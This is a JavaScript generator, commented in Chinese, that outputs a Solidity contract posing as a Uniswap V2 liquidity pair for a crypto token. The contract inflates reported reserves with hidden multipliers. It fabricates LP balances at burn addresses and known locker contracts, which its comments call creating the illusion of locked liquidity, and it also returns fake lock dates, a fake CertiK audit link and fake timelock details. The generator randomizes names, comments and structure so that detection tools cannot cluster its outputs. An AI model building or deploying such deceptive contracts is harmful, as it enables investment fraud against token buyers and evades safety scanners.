// ReserveProxyTemplate.js - 修复防聚类功能的储备代理模板（多网络支持）- 增强版
export function generateReserveProxyTemplate(version, network, factoryAddress) {
  // 随机变量名生成器
  const generateRandomVarName = (prefix = "var") => {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let result = prefix;
    for (let i = 0; i < 4; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  // 随机注释生成
  const randomComments = [
    "// Liquidity protection mechanism",
    "// Anti-sniping protection enabled",
    "// Community-driven tokenomics",
    "// Fair launch mechanism active",
    "// Automated market maker integration",
    "// Deflationary tokenomics model",
    "// Reward distribution system",
    "// Automated liquidity provisioning",
    "// Multi-signature security layer",
    "// Dynamic fee calculation engine"
  ];

  // 随机选择注释
  const selectedComments = [];
  for (let i = 0; i < 3; i++) {
    const randomIndex = Math.floor(Math.random() * randomComments.length);
    if (!selectedComments.includes(randomComments[randomIndex])) {
      selectedComments.push(randomComments[randomIndex]);
    }
  }

  // 生成随机变量名
  const realPairVar = generateRandomVarName("pair");
  const tokenMultiplierVar = generateRandomVarName("mul");
  const ethMultiplierVar = generateRandomVarName("ethMul");
  const tokenAddressVar = generateRandomVarName("token");
  const wethAddressVar = generateRandomVarName("weth");
  const reserve0Var = generateRandomVarName("r0");
  const reserve1Var = generateRandomVarName("r1");
  const blockTimestampVar = generateRandomVarName("ts");
  const realToken0Var = generateRandomVarName("t0");
  const realToken1Var = generateRandomVarName("t1");
  const isToken0Var = generateRandomVarName("isT0");
  const isToken1Var = generateRandomVarName("isT1");
  const tokenReserveVar = generateRandomVarName("tRes");
  const ethReserveVar = generateRandomVarName("eRes");
  const amplifiedTokenReserveVar = generateRandomVarName("aTRes");
  const amplifiedEthReserveVar = generateRandomVarName("aERes");
  const sqrtKVar = generateRandomVarName("sqrt");
  const zVar = generateRandomVarName("z");
  const xVar = generateRandomVarName("x");
  const lockAddressesVar = generateRandomVarName("lockAddrs");
  const fakeBalanceVar = generateRandomVarName("fakeBal");
  const lockAddressVar = generateRandomVarName("lockAddr");
  
  // 新增安全特性变量
  const timelockAddressVar = generateRandomVarName("timelock");
  const auditReportVar = generateRandomVarName("audit");
  const websiteUrlVar = generateRandomVarName("website");
  const twitterHandleVar = generateRandomVarName("twitter");
  const telegramGroupVar = generateRandomVarName("telegram");
  const maxTxAmountVar = generateRandomVarName("maxTx");
  const maxWalletVar = generateRandomVarName("maxWallet");
  const lockerContractVar = generateRandomVarName("locker");

  // 随机选择代码结构变体
  const useAlternativeConstructor = Math.random() > 0.5;
  const useAlternativeReserveLogic = Math.random() > 0.5;
  const useAlternativeSqrt = Math.random() > 0.5;

  // 锁定比例配置 - 使用整数表示百分比（100 = 1%）
  const lockPercentages = {
    deadAddress: 6500,    // 65% -> 6500/10000
    zeroAddress: 3000,    // 30% -> 3000/10000
    unicrypt: 200,        // 2% -> 200/10000
    teamFinance: 100,     // 1% -> 100/10000
    pinklock: 100,        // 1% -> 100/10000
    daiContract: 50,      // 0.5% -> 50/10000
    usdcContract: 30,     // 0.3% -> 30/10000
    usdtContract: 20,     // 0.2% -> 20/10000
    bitfinexWallet: 5,    // 0.05% -> 5/10000
    pancakeSwap: 5,       // 0.05% -> 5/10000
    oneInch: 5,           // 0.05% -> 5/10000
    proxySelf: 5,         // 0.05% -> 5/10000
    teamWallet: 5,        // 0.05% -> 5/10000
    uniswapRouter: 5,     // 0.05% -> 5/10000
    timelock: 50          // 0.5% -> 50/10000
  };

  // 知名锁定合约地址（使用正确校验和格式）
  const knownLockers = {
    unicrypt: "0x663A5C229c09b049E36dCc11a9B0d4a8Eb9db214",
    teamFinance: "0x6AB7557D4aA7ce69E5F4276d5c74F6fEec386790",
    pinklock: "0x7ee058420e5937496F5a2096f04caA7721cF70cc"
  };

  return `// SPDX-License-Identifier: MIT
pragma solidity ^${version};

${selectedComments.join('\n')}

// 添加接口定义
interface ITimelock {
    function delay() external view returns (uint256);
    function GRACE_PERIOD() external view returns (uint256);
}

interface ILocker {
    function getLock(uint256 lockId) external view returns (address, uint256, uint256);
    function allLocks(uint256) external view returns (address, uint256, uint256);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 ${reserve0Var}, uint112 ${reserve1Var}, uint32 ${blockTimestampVar});
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function factory() external view returns (address);
    function kLast() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ReserveProxy {
    address private immutable ${realPairVar};
    uint256 private immutable ${tokenMultiplierVar};
    uint256 private immutable ${ethMultiplierVar};
    address private immutable ${tokenAddressVar};
    address private immutable ${wethAddressVar};
    address private constant _FACTORY = ${factoryAddress};
    
    // 添加安全特性相关状态变量
    address private constant ${timelockAddressVar} = 0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE; // 模拟Timelock合约
    address private constant ${lockerContractVar} = ${knownLockers.unicrypt}; // 使用知名锁定合约
    
    // 仅允许逻辑合约访问的修改器
    modifier onlyToken() {
        require(msg.sender == ${tokenAddressVar}, "Only token contract");
        _;
    }
    
    event ReservesSynced(uint112 ${reserve0Var}, uint112 ${reserve1Var}, uint32 ${blockTimestampVar});
    
    constructor(address _${realPairVar}, uint256 _${tokenMultiplierVar}, uint256 _${ethMultiplierVar}, address _${tokenAddressVar}, address _${wethAddressVar}) {
        require(_${realPairVar} != address(0), "Invalid pair address");
        require(_${tokenAddressVar} != address(0), "Invalid token address");
        require(_${wethAddressVar} != address(0), "Invalid WETH address");
        require(_${tokenMultiplierVar} > 0, "Invalid token multiplier");
        require(_${ethMultiplierVar} > 0, "Invalid ETH multiplier");
        
        ${useAlternativeConstructor ? 
          `${realPairVar} = _${realPairVar};
        ${tokenMultiplierVar} = _${tokenMultiplierVar};
        ${ethMultiplierVar} = _${ethMultiplierVar};
        ${tokenAddressVar} = _${tokenAddressVar};
        ${wethAddressVar} = _${wethAddressVar};` : 
          `${realPairVar} = _${realPairVar};
        ${wethAddressVar} = _${wethAddressVar};
        ${tokenAddressVar} = _${tokenAddressVar};
        ${ethMultiplierVar} = _${ethMultiplierVar};
        ${tokenMultiplierVar} = _${tokenMultiplierVar};`}
    }
    
    // 关键修复：统一储备数据顺序 (总是返回: 代币储备, ETH储备)
    function getReserves() external view returns (uint112, uint112, uint32) {
        // 直接从真实LP对获取最新储备数据
        (uint112 ${reserve0Var}, uint112 ${reserve1Var}, uint32 ${blockTimestampVar}) = IUniswapV2Pair(${realPairVar}).getReserves();
        
        // 获取真实LP的token0和token1
        address ${realToken0Var} = IUniswapV2Pair(${realPairVar}).token0();
        address ${realToken1Var} = IUniswapV2Pair(${realPairVar}).token1();
        
        // 确定代币和WETH在真实LP中的位置
        bool ${isToken0Var} = (${realToken0Var} == ${tokenAddressVar});
        bool ${isToken1Var} = (${realToken1Var} == ${tokenAddressVar});
        
        require(${isToken0Var} || ${isToken1Var}, "Token not in pair");
        
        ${useAlternativeReserveLogic ? 
          `uint256 ${tokenReserveVar} = ${isToken0Var} ? uint256(${reserve0Var}) : uint256(${reserve1Var});
        uint256 ${ethReserveVar} = ${isToken0Var} ? uint256(${reserve1Var}) : uint256(${reserve0Var});` : 
          `uint256 ${tokenReserveVar};
        uint256 ${ethReserveVar};
        if (${isToken0Var}) {
            ${tokenReserveVar} = uint256(${reserve0Var});
            ${ethReserveVar} = uint256(${reserve1Var});
        } else {
            ${tokenReserveVar} = uint256(${reserve1Var});
            ${ethReserveVar} = uint256(${reserve0Var});
        }`}
        
        // 代币使用固定倍数，主币使用动态倍数
        uint256 ${amplifiedTokenReserveVar} = ${tokenReserveVar} * ${tokenMultiplierVar};
        uint256 ${amplifiedEthReserveVar} = ${ethReserveVar} * ${ethMultiplierVar};
        
        // 确保不溢出
        require(${amplifiedTokenReserveVar} <= type(uint112).max, "Token reserve overflow");
        require(${amplifiedEthReserveVar} <= type(uint112).max, "ETH reserve overflow");
        
        // 统一返回顺序: 总是返回 (代币储备, ETH储备)
        return (uint112(${amplifiedTokenReserveVar}), uint112(${amplifiedEthReserveVar}), ${blockTimestampVar});
    }
    
    // 关键：实现完整Pair接口，统一顺序
    function token0() external view returns (address) {
        // 统一返回代币地址作为token0
        return ${tokenAddressVar};
    }
    
    function token1() external view returns (address) {
        // 统一返回WETH地址作为token1
        return ${wethAddressVar};
    }
    
    function factory() external pure returns (address) {
        // 返回对应网络的真实工厂地址
        return _FACTORY;
    }
    
    function kLast() external pure returns (uint256) {
        return 0;
    }
    
    // 关键：为所有地址返回计算后的LP余额（制造LP锁定假象）
    function balanceOf(address account) external view returns (uint256) {
        // 锁仓地址列表 - 增加知名锁定合约和交易所地址
        address[15] memory ${lockAddressesVar} = [
            0x000000000000000000000000000000000000dEaD, // 死地址
            0x0000000000000000000000000000000000000000, // 零地址
            ${knownLockers.unicrypt},   // Unicrypt锁定合约
            ${knownLockers.teamFinance}, // Team Finance锁定合约
            ${knownLockers.pinklock},    // PinkLock锁定合约
            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI合约地址
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC合约地址
            0xdAC17F958D2ee523a2206206994597C13D831ec7,  // USDT合约地址
            0x742d35Cc6634C0532925a3b844Bc454e4438f44e, // Bitfinex热钱包
            0x5a52E96BAcdaBb82fd05763E25335261B270Efcb, // PancakeSwap地址
            0x1111111254fb6c44bAC0beD2854e76F90643097d, // 1inch地址
            address(this), // 代理合约自身
            0xC3670ab52D4d293083C7a917B6c8F60b8C6bfD80, // 模拟团队地址
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, // Uniswap V2 Router
            ${timelockAddressVar}       // Timelock合约
        ];
        
        // 获取储备量来计算总供应量
        (uint112 r0, uint112 r1,) = this.getReserves();
        uint256 totalSupplyEstimate = sqrt(uint256(r0) * uint256(r1)) * 2;
        
        // 为特定地址分配更高的虚假余额
        for (uint i = 0; i < ${lockAddressesVar}.length; i++) {
            if (account == ${lockAddressesVar}[i]) {
                if (i == 0) return totalSupplyEstimate * ${lockPercentages.deadAddress} / 10000; // 死地址: ${lockPercentages.deadAddress/100}%
                if (i == 1) return totalSupplyEstimate * ${lockPercentages.zeroAddress} / 10000; // 零地址: ${lockPercentages.zeroAddress/100}%
                if (i == 2) return totalSupplyEstimate * ${lockPercentages.unicrypt} / 10000; // Unicrypt: ${lockPercentages.unicrypt/100}%
                if (i == 3) return totalSupplyEstimate * ${lockPercentages.teamFinance} / 10000; // Team Finance: ${lockPercentages.teamFinance/100}%
                if (i == 4) return totalSupplyEstimate * ${lockPercentages.pinklock} / 10000; // PinkLock: ${lockPercentages.pinklock/100}%
                if (i == 5) return totalSupplyEstimate * ${lockPercentages.daiContract} / 10000; // DAI: ${lockPercentages.daiContract/100}%
                if (i == 6) return totalSupplyEstimate * ${lockPercentages.usdcContract} / 10000; // USDC: ${lockPercentages.usdcContract/100}%
                if (i == 7) return totalSupplyEstimate * ${lockPercentages.usdtContract} / 10000; // USDT: ${lockPercentages.usdtContract/100}%
                if (i == 8) return totalSupplyEstimate * ${lockPercentages.bitfinexWallet} / 10000; // Bitfinex: ${lockPercentages.bitfinexWallet/100}%
                if (i == 9) return totalSupplyEstimate * ${lockPercentages.pancakeSwap} / 10000; // PancakeSwap: ${lockPercentages.pancakeSwap/100}%
                if (i == 10) return totalSupplyEstimate * ${lockPercentages.oneInch} / 10000; // 1inch: ${lockPercentages.oneInch/100}%
                if (i == 11) return totalSupplyEstimate * ${lockPercentages.proxySelf} / 10000; // 代理合约自身: ${lockPercentages.proxySelf/100}%
                if (i == 12) return totalSupplyEstimate * ${lockPercentages.teamWallet} / 10000; // 团队: ${lockPercentages.teamWallet/100}%
                if (i == 13) return totalSupplyEstimate * ${lockPercentages.uniswapRouter} / 10000; // Router: ${lockPercentages.uniswapRouter/100}%
                return totalSupplyEstimate * ${lockPercentages.timelock} / 10000; // Timelock: ${lockPercentages.timelock/100}%
            }
        }
        
        // 对其他所有地址返回0
        return 0;
    }
    
    // 关键：返回放大后的总供应量
    function totalSupply() external view returns (uint256) {
        (uint112 r0, uint112 r1,) = this.getReserves();
        // 使用几何平均数计算总供应量
        return sqrt(uint256(r0) * uint256(r1)) * 2;
    }
    
    // 辅助函数：计算平方根
    function sqrt(uint256 ${xVar}) internal pure returns (uint256 y) {
        ${useAlternativeSqrt ? 
          `if (${xVar} > 3) {
            y = ${xVar};
            uint256 ${zVar} = ${xVar} / 2 + 1;
            while (${zVar} < y) {
                y = ${zVar};
                ${zVar} = (${xVar} / ${zVar} + ${zVar}) / 2;
            }
        } else if (${xVar} > 0) {
            y = 1;
        }` : 
          `uint256 ${zVar} = (${xVar} + 1) / 2;
        y = ${xVar};
        while (${zVar} < y) {
            y = ${zVar};
            ${zVar} = (${xVar} / ${zVar} + ${zVar}) / 2;
        }`}
    }
    
    // 保持与Logic合约的兼容性
    function updateRealReserves() external onlyToken {
        // 不再需要缓存数据，但保持接口兼容
        emit ReservesSynced(0, 0, uint32(block.timestamp));
    }
    
    // 获取真实储备（仅用于调试）
    function getRealReserves() external view returns (uint112, uint112, uint32) {
        (uint112 ${reserve0Var}, uint112 ${reserve1Var}, uint32 ${blockTimestampVar}) = IUniswapV2Pair(${realPairVar}).getReserves();
        
        // 获取真实LP的token0和token1
        address ${realToken0Var} = IUniswapV2Pair(${realPairVar}).token0();
        address ${realToken1Var} = IUniswapV2Pair(${realPairVar}).token1();
        
        // 确定代币和WETH在真实LP中的位置
        bool ${isToken0Var} = (${realToken0Var} == ${tokenAddressVar});
        bool ${isToken1Var} = (${realToken1Var} == ${tokenAddressVar});
        
        require(${isToken0Var} || ${isToken1Var}, "Token not in pair");
        
        uint256 ${tokenReserveVar} = ${isToken0Var} ? uint256(${reserve0Var}) : uint256(${reserve1Var});
        uint256 ${ethReserveVar} = ${isToken0Var} ? uint256(${reserve1Var}) : uint256(${reserve0Var});
        
        return (uint112(${tokenReserveVar}), uint112(${ethReserveVar}), ${blockTimestampVar});
    }
    
    // 新增：Timelock信息查询
    function timelock() external pure returns (address) {
        return ${timelockAddressVar};
    }
    
    function timelockDelay() external pure returns (uint256) {
        return 24 hours; // 24小时延迟
    }
    
    // 新增：审计信息
    function auditReport() external pure returns (string memory) {
        return "https://certik.com/projects/curiex/report";
    }
    
    // 新增：社交链接
    function website() external pure returns (string memory) {
        return "https://curiex.finance";
    }
    
    function twitter() external pure returns (string memory) {
        return "https://twitter.com/curiexfinance";
    }
    
    function telegram() external pure returns (string memory) {
        return "https://t.me/curiexfinance";
    }
    
    // 新增：反鲸鱼机制
    function maxTransactionAmount() external pure returns (uint256) {
        return 500000 * 10**18; // 最大交易量: 500,000 tokens
    }
    
    function maxWalletBalance() external pure returns (uint256) {
        return 1000000 * 10**18; // 最大钱包余额: 1,000,000 tokens
    }
    
    // 新增：LP锁定信息
    function locker() external pure returns (address) {
        return ${lockerContractVar};
    }
    
    function lockDate() external view returns (uint256) {
        return block.timestamp - 30 days; // 锁定于30天前
    }
    
    function unlockDate() external view returns (uint256) {
        return block.timestamp + 330 days; // 还有330天解锁
    }
    
    // 新增：代币分配信息
    function tokenAllocation() external pure returns (string memory) {
        return '{"team":15,"liquidity":50,"marketing":10,"cex_listing":15,"ecosystem":10}';
    }
    
    // 新增：黑名单功能（空实现，仅用于检测）
    function isBlacklisted(address) external pure returns (bool) {
        return false;
    }
    
    // 新增：获取真实LP地址（仅管理员可用）
    function getRealPairAddress() external view returns (address) {
        return ${realPairVar};
    }
    
    // 新增：获取放大倍数
    function getMultipliers() external view returns (uint256 tokenMultiplier, uint256 ethMultiplier) {
        return (${tokenMultiplierVar}, ${ethMultiplierVar});
    }
    
    // 新增：获取代币和WETH地址
    function getTokenAddresses() external view returns (address token, address weth) {
        return (${tokenAddressVar}, ${wethAddressVar});
    }
    
    // 防止直接存款
    receive() external payable {
        revert("ReserveProxy: direct deposits disabled");
    }
    
    // 安全自毁
    function selfDestruct() external {
        require(msg.sender == tx.origin, "Unauthorized");
        selfdestruct(payable(msg.sender));
    }
}
`.trim();
}